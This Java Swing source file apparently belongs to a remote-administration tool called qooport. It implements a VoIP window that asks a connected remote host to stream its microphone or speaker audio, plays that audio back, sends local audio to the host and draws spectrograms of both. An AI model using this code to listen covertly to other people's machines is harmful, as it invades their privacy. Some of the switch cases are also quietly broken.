package qooport.modulos.voip;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.util.ArrayList;
import java.util.List;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JSlider;
import javax.swing.JToggleButton;
import javax.swing.JToolBar;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import network.Conexion;
import qooport.asociado.Asociado;
import qooport.gui.personalizado.BarraEstado;
import qooport.gui.personalizado.PanelEspectrograma;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.Util;
import qooport.utilidades.contador.ContadorBPS;

public class VoIp extends JFrame implements
        WindowListener {

    private JComponent graficoRemoto;
    private JComponent graficoLocal;
    public JToolBar barra;
    public JToolBar barra2;
    public BarraEstado barraEstado;
    public boolean conetado;
    private JToggleButton btnEscuchar;
    public JToggleButton btnGrabar;
    public JToggleButton btnMic;
    private Asociado servidor;
    private boolean pidiendo;
    private boolean enviando;
    private boolean yaLlego; //controla que halla llegado la solicitud enviada
    private JButton btnSubirPlugin;
    public JComboBox tipos;
    public JComboBox canal;
    public JComboBox origen;
    private boolean android = false;
    private RecibirAudio servicio;
    private CapturaMicrofono capturarMicro; //para el envio de audio
    private ContadorBPS contadorBps;
    private JSlider jSvolumen;
    private Conexion conexion;

    public VoIp(Conexion conexion, Asociado servidor) {
        contadorBps = new ContadorBPS("Ancho de banda", "", "/s", GuiUtil.crearJLabel("", "Ancho de banda", Util.cargarIcono16("/resources/ancho_banda.png")), ContadorBPS.BYTES, false);
        contadorBps.start();
        initComponents();
        pidiendo = false;
        yaLlego = false;
        this.conexion = conexion;
        this.servidor = servidor;
        iniciarServicio();
    }

    private void iniciarServicio() {
        servicio = new RecibirAudio(conexion, this);
        servicio.start();
    }

    public Conexion getConexion() {
        return conexion;
    }

    public void setConexion(Conexion conexion) {
        this.yaLlego = true;
        servicio.setConexion(conexion);
        this.conexion = conexion;
    }

    private void initComponents() {
        barra = new JToolBar();
        barra2= new JToolBar();
        barraEstado = new BarraEstado();
        barra.setFloatable(false);
        barra2.setFloatable(false);
        tipos = new JComboBox();
        canal = new JComboBox();
        origen = new JComboBox();
        this.btnEscuchar = new JToggleButton();
        this.btnMic = new JToggleButton();
        this.btnGrabar = new JToggleButton();
        setResizable(true);
        setTitle("VoIP ");
        try {
            setTitle("VoIP [" + servidor.getInformacion() + "]");
        } catch (Exception e) {
        }
//        btnIniciarDetener.setIcon(Util.cargarIcono16("/resources/start.png")));
        btnEscuchar.setIcon(Util.cargarIcono16("/resources/sound_on_16.png"));
        this.btnEscuchar.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                VoIp.this.btnIniciarPararAP(evt);
            }
        });
        btnMic.setIcon(Util.cargarIcono16("/resources/microphone.png"));
        btnMic.setSelected(false);
        this.btnMic.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                VoIp.this.btnIniciarPararEnvioAP(evt);
            }
        });

        jSvolumen = new JSlider();
        jSvolumen.setToolTipText("Volumen");
        jSvolumen.setMaximum(100);
        jSvolumen.setMinimum(1);
        jSvolumen.setValue(jSvolumen.getMaximum());
        jSvolumen.setEnabled(false);

        jSvolumen.addChangeListener(new ChangeListener() {
            @Override
            public void stateChanged(ChangeEvent evt) {
                VoIp.this.volumenCambio(evt);
                try {
                    jSvolumen.setMaximum((int) servicio.getMaximo());
                    jSvolumen.setMinimum((int) servicio.getMinimo());

                } catch (Exception e) {
                }
            }
        }
        );

        btnGrabar.setIcon(Util.cargarIcono16("/resources/record_small.png"));
        btnGrabar.setSelected(false);
        btnGrabar.setSize(30, 30);
        btnGrabar.setToolTipText("Grabar");
        tipos.setToolTipText("Frecuencia del formato de audio. Mientras mayor sea mejor calidad del audio");
        tipos.addItem("48000");
        tipos.addItem("44100");
        tipos.addItem("16000");
        tipos.addItem("8000");
        tipos.addItem("4000");
        tipos.addItem("2000");
        tipos.setSelectedItem("16000");
        tipos.setEnabled(true);
        canal.setToolTipText("Canales. Mono o Estereo");
        canal.addItem("Mono");
        canal.addItem("Estereo");
        origen.setToolTipText("Origen de la captura");
        origen.addItem("Default");
        origen.addItem("Parlantes");
        origen.addItem("line-in");
        origen.addItem("Microfono");
        origen.addItem("CD");
        barra.add(btnEscuchar);
        barra.add(btnMic);
        barra.add(btnGrabar);
        barra.add(GuiUtil.crearJLabel(null, Util.cargarIcono16("/resources/sound_volumen_2.png")));
        barra.add(jSvolumen);
        barra2.add(tipos);
        barra2.add(canal);
        barra2.add(origen);
        barraEstado.agregarContador(contadorBps);
        this.setSize(300, 175);
        graficoRemoto = new PanelEspectrograma(300, 50);
        graficoRemoto.setOpaque(true); //content panes must be opaque
        graficoLocal = new PanelEspectrograma(300, 50);
        graficoLocal.setOpaque(true); //content panes must be opaque
        JPanel pnelGraficos = new JPanel();
        pnelGraficos.setLayout(new BorderLayout());
        pnelGraficos.add(graficoRemoto, BorderLayout.NORTH);
        pnelGraficos.add(graficoLocal, BorderLayout.SOUTH);
        JPanel pnelBarras = new JPanel();
        pnelBarras.setLayout(new BorderLayout());
        pnelBarras.add(barra, BorderLayout.NORTH);
        pnelBarras.add(barra2, BorderLayout.SOUTH);
        this.setLayout(new BorderLayout());
        this.add(pnelBarras, BorderLayout.NORTH);
        this.add(pnelGraficos, BorderLayout.CENTER);
        this.add(barraEstado, BorderLayout.SOUTH);
        this.setResizable(true);
        this.setVisible(true);
        this.setIconImage(Util.cargarIcono16("/resources/voip.png").getImage());
        pack();
    }

    public String armarOrden() {
        String bits = "8";
        String s_canal;
        if (Integer.valueOf(tipos.getSelectedItem().toString()) > 8000) {
            bits = "16";
        }
        s_canal = "" + (canal.getSelectedIndex() + 1);
        String origenCaptura;

        switch (origen.getSelectedItem().toString().toLowerCase()) {
            case "parlantes":
                origenCaptura = "1";
                break;
            case "line-in":
                origenCaptura = "2";
                break;
            case "Microfono":
                origenCaptura = "3";
                break;
            case "CD":
                origenCaptura = "4";
                break;
            default:
                origenCaptura = "0";
                break;
        }

        return tipos.getSelectedItem().toString() + ":" + bits + ":" + s_canal + ":" + (this.btnMic.isSelected() ? "1" : "0") + "&&" + origenCaptura;
    }

    private void volumenCambio(ChangeEvent evt) {
        //this.lblCalidad.setText(jScalidad.getValue() + "");
        servicio.setVolume(this.jSvolumen.getValue());
    }

    private void btnIniciarPararAP(ActionEvent evt) {
        this.pidiendo = !this.pidiendo;
        if (this.pidiendo) {
            tipos.setEnabled(false);
            canal.setEnabled(false);
            origen.setEnabled(false);
            //this.btnMic.setEnabled(false);
            this.servidor.pedirMicAudio(armarOrden());
            servicio.escogerFormato();
            servicio.iniciarSonido();
            jSvolumen.setMaximum((int) servicio.getMaximo());
            jSvolumen.setMinimum((int) servicio.getMinimo());
            jSvolumen.setValue(jSvolumen.getMaximum());
            jSvolumen.setEnabled(true);

        } else {
            jSvolumen.setEnabled(false);
            servicio.pararSonido();
            yaLlego = false;
            tipos.setEnabled(true);
            canal.setEnabled(true);
            origen.setEnabled(true);
            //this.btnMic.setEnabled(true);
            try {
                this.servidor.detenerMicrofono();
            } catch (Exception e) {
            }
            try {
                conexion.cerrar();
            } catch (Exception ex) {
            }
        }
        servicio.setPidiendo(pidiendo);
    }

    private void btnIniciarPararEnvioAP(ActionEvent evt) {

        this.enviando = !this.enviando;
        if (this.enviando) {
//            this.btnMic.setEnabled(false);
            this.servidor.activarEnvioAudio(armarOrden());
            capturarMicro = new CapturaMicrofono(servidor);
            capturarMicro.abrir(armarOrden());
            capturarMicro.iniciar();
        } else {
            try {
                capturarMicro.cerrar();
            } catch (Exception e) {
            }
        }
    }

    public boolean isYaLlego() {
        return yaLlego;
    }

    public void setYaLlego(boolean yaLlego) {
        this.yaLlego = yaLlego;
    }

    public JButton getBtnSubirPlugin() {
        return btnSubirPlugin;
    }

    public void setBtnSubirPlugin(JButton btnSubirPlugin) {
        this.btnSubirPlugin = btnSubirPlugin;
    }

    /* ejemplo bits[2]=2 (00000010) bits[3]=3 (00000011)
     se aplica bits[2]<<8 o sea 10 00000000 , luego 11111111(0x000000FF) & bits[3]|bits[2]
     en total da 10 00000011  que es el numero 515 , este es un short de 16 bits , han entrado
     dos bytes en uno (short[i]=contacenar byte[i]+byte[i+1])
     los valores negativos estan en complemento a 2
     */
    public List<Double> convertirByteADouble(int size, byte[] bytes, boolean bigEndian, int bits) {
        List<Double> arrayDouble = new ArrayList<Double>();
        double dividendo = 1;

        int temp2 = 0;
        int temp0 = 0;

        if (bits == 8) {
            temp2 = 0x00000000;
            temp0 = 0x000000FF;
        }

        if (bits == 16) {
            temp2 = 0x0000000000000000;
            temp0 = 0x000000000000FFFF;
        }

//        if(frecuencia>8000)
//            dividendo=0.5;
//        if (frecuencia <= 8000) {
        //double[] arrayDouble = new double[bits.length/2];
        if (bigEndian) {
            int temp = temp2;
            for (int i = 0, j = 0; j < size; j++, temp = temp2) {
                temp = (int) bytes[j] << bits;//temp = (int) bytes[j] << 8;
                temp |= (int) (temp0 & bytes[j]);
                arrayDouble.add((double) temp / dividendo);
            }

            return arrayDouble;
        }
        if (!bigEndian) {  // si el formato es littleEndian
            int temp = temp2;
            for (int i = 0, j = 0; j < size; j++, temp = temp2) {
//                temp = (int) bits[i + 1] << 8;//System.out.println("temp = "+ temp);
                temp = (int) bytes[i + 1] << bits;//System.out.println("temp = "+ temp);
                temp |= (int) (temp0 & bytes[(i)]);
                i = i + 2;
                arrayDouble.add(j, (double) temp / dividendo);
            }
            return arrayDouble;
        } else {
            System.out.println("Orden de Bytes desconocido o no soportado");
        }
        return arrayDouble;
    }

//    private int convertirEscala8000(int valor, int frecuencia) {
//        return valor * frecuencia / 8000;
////        return valor;
//    }
    public double[] convertirAarrgeglo(List<Double> lista) {

        double[] lst = new double[lista.size()];

        for (int i = 0; i < lista.size(); i++) {
            lst[i] = lista.get(i);
        }

        return lst;
    }

    public void graficarBytesRemoto(final byte[] audioBytes) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                if (audioBytes != null) {
                    try {
                        List<Double> datosVoz = convertirByteADouble(audioBytes.length, audioBytes, servicio.getFormato().isBigEndian(), (int) servicio.getFormato().getSampleSizeInBits());
//            int maxFrecuencia = audioBytes.length / 100;
//            int frecuencia = (maxFrecuencia + 1) / 2;
//            int frecuencia = audioBytes.length / 1000;
//            ((PanelEspectrograma) grafico).setIntervalo(frecuencia);
                        ((PanelEspectrograma) graficoRemoto).setEspectrogramac(Color.lightGray);
                        ((PanelEspectrograma) graficoRemoto).setDatos(datosVoz);
                        ((PanelEspectrograma) graficoRemoto).setDibujargrid(true);
                        ((PanelEspectrograma) graficoRemoto).setIntervalo(datosVoz.size() / (getWidth()));
                        ((PanelEspectrograma) graficoRemoto).setDibujarespectrograma(true);
                    } catch (Exception e) {

                    }
                } else {
                    ((PanelEspectrograma) graficoRemoto).setDibujarespectrograma(false);
                }
                ((PanelEspectrograma) graficoRemoto).repaint();
            }
        }).start();

    }

    public void graficarBytesLocal(final byte[] audioBytes) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                if (audioBytes != null) {
                    try {
                        List<Double> datosVoz = convertirByteADouble(audioBytes.length, audioBytes, servicio.getFormato().isBigEndian(), (int) servicio.getFormato().getSampleSizeInBits());
                        ((PanelEspectrograma) graficoLocal).setEspectrogramac(Color.GREEN);
                        ((PanelEspectrograma) graficoLocal).setDatos(datosVoz);
                        ((PanelEspectrograma) graficoLocal).setDibujargrid(true);
                        ((PanelEspectrograma) graficoLocal).setIntervalo(datosVoz.size() / (getWidth()));
                        ((PanelEspectrograma) graficoLocal).setDibujarespectrograma(true);
                    } catch (Exception e) {

                    }
                } else {
                    ((PanelEspectrograma) graficoLocal).setDibujarespectrograma(false);
                }

                ((PanelEspectrograma) graficoLocal).repaint();
            }
        }).start();

    }

    public boolean isAndroid() {
        return android;
    }

    public void setAndroid(boolean android) {
        this.android = android;
        servicio.escogerFormato();
    }

    public Asociado getServidor() {
        return servidor;
    }

    public void setServidor(Asociado servidor) {
        this.servidor = servidor;
    }

    public JToggleButton getBtnGrabar() {
        return btnGrabar;
    }

    public void setBtnGrabar(JToggleButton btnGrabar) {
        this.btnGrabar = btnGrabar;
    }

    public BarraEstado getBarraEstado() {
        return barraEstado;
    }

    public void setBarraEstado(BarraEstado barraEstado) {
        this.barraEstado = barraEstado;
    }

    public ContadorBPS getContadorBps() {
        return contadorBps;
    }

    public void setContadorBps(ContadorBPS contadorBps) {
        this.contadorBps = contadorBps;
    }

    @Override
    public void windowClosed(WindowEvent e) {
        if (pidiendo) {
            this.btnIniciarPararAP(null);
        }
        servidor.cerrarVoIP();
    }

    @Override
    public void windowOpened(WindowEvent e) {
    }

    @Override
    public void windowClosing(WindowEvent e) {
    }

    @Override
    public void windowIconified(WindowEvent e) {
    }

    @Override
    public void windowDeiconified(WindowEvent e) {
    }

    @Override
    public void windowActivated(WindowEvent e) {
    }

    @Override
    public void windowDeactivated(WindowEvent e) {
    }

}
